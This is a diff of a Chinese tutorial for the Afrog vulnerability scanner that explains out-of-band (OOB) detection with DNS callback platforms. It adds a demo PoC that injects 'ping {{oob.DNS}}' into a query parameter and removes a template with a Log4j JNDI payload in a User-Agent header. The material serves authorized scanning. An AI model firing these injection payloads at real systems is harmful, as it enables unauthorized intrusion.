@@ -22,6 +22,10 @@ Afrog 的配置文件名为 `afrog-config.yaml`。
 很多高危漏洞（如 Log4j2、Fastjson、Blind SSRF、Blind SQLi）触发后，服务器**不会返回任何错误信息**，而是默默执行命令。
 这时候，我们需要让服务器去访问我们控制的一台机器（反连平台）。如果我们的机器收到了请求，就证明漏洞存在。
 
+本课的目标很明确：把 OOB **配好、跑通、看懂证据**。
+如果你想系统学习“新版 OOB 体系大升级”的完整细节（旧写法对照、更多模板、排错清单、证据解释），建议配合阅读这篇：
+[OOB 体系大升级：新版写法与证据教程（v3.3.9）](https://github.com/zan8in/afrog/wiki/OOB-%E4%BD%93%E7%B3%BB%E5%A4%A7%E5%8D%87%E7%BA%A7%EF%BC%9A%E6%96%B0%E7%89%88%E5%86%99%E6%B3%95%E4%B8%8E%E8%AF%81%E6%8D%AE%E6%95%99%E7%A8%8B%EF%BC%88v3.3.9%EF%BC%89)
+
 ### 先说“最新版 OOB”到底升级了什么？
 如果你用过旧版 OOB，你可能见过一种“经典套路”：**触发 -> 等几秒 -> 去平台查一下有没有命中**。
 它能用，但也有两个痛点：
@@ -96,6 +100,50 @@ reverse:
     http_url: "http://yourdomain.com"
     api_url: "http://yourdomain.com/revsuit/api"
 ```
+
+### 🔰 3 分钟跑通 OOB（新手必做）
+
+很多人第一次写 OOB PoC 失败，不是 PoC 写错，而是 **平台没配好 / 不知道证据在哪里看**。
+你按下面三步走，先把“最小闭环”跑通，再去写更复杂的 PoC。
+
+#### 第一步：确认反连平台配置 OK
+- 你至少要配好一个平台（推荐 Ceye，临时用可以 dnslog.cn）。
+- 没配平台时：`oobCheck(...)` 基本都会一直返回 false。
+
+#### 第二步：用一个最小 OOB PoC 测通
+把下面 PoC 保存成一个文件（例如 `demo-oob-dns.yaml`），然后对一个你有权限测试的目标运行：
+
+```yaml
+id: demo-oob-dns
+
+info:
+  name: Demo OOB DNS
+  author: your-name
+  severity: info
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /?dns=ping%20{{oob.DNS}}
+    expression: oobCheck("dns", 5)
+
+expression: r0()
+```
+
+运行（示例）：
+```bash
+afrog -t http://example.com -P /path/to/demo-oob-dns.yaml
+```
+
+> 小提醒：这个 PoC 只是“演示最小闭环”。真实漏洞 PoC 通常要把“触发条件”与 “OOB 命中等待”组合，避免误报：
+> `expression: response.status == 200 && oobCheck("dns", 5)`
+
+#### 第三步：确认你能看到 `oob_evidence` 证据
+命中后，你至少应该在这些地方之一看到 OOB 证明：
+- 终端输出（命中结果里包含 `oob_evidence`）
+- `report.html` 报告（漏洞详情会显示 OOB Evidence）
+- AfrogWeb 报告（漏洞详情里显示 `oob_evidence`，便于复核与留证）
 
 ### 新版 OOB PoC 怎么写？（最推荐写法）
 先记住两条铁律：
@@ -176,30 +224,8 @@ rules:
 expression: r0()
 ```
 
-#### 模板 3：JNDI（DNS 观测，Log4j 类常用）
-```yaml
-id: demo-oob-jndi
-
-info:
-  name: Demo OOB JNDI (DNS Observe)
-  author: your-name
-  severity: info
-
-rules:
-  r0:
-    request:
-      method: GET
-      path: /
-      headers:
-        User-Agent: "${jndi:ldap://{{oob.DNS}}/a}"
-    expression: oobCheck("dns", 5)
-
-expression: r0()
-```
-
-#### 模板 4：证据输出（推荐给高危 PoC）
-你不需要手动写 output，Afrog 会在命中时自动把 `oob_evidence` 作为证据挂到结果里。
-终端输出、`report.html` 报告和 AfrogWeb 报告都会显示这段 OOB 证明内容，方便你复核与留证。
+想看更多 OOB 模板（JNDI、XXE、SSRF、命令执行外带等）以及更完整的证据/排错讲解，可以看：
+[OOB 体系大升级：新版写法与证据教程（v3.3.9）](https://github.com/zan8in/afrog/wiki/OOB-%E4%BD%93%E7%B3%BB%E5%A4%A7%E5%8D%87%E7%BA%A7%EF%BC%9A%E6%96%B0%E7%89%88%E5%86%99%E6%B3%95%E4%B8%8E%E8%AF%81%E6%8D%AE%E6%95%99%E7%A8%8B%EF%BC%88v3.3.9%EF%BC%89)
 
 
 ---
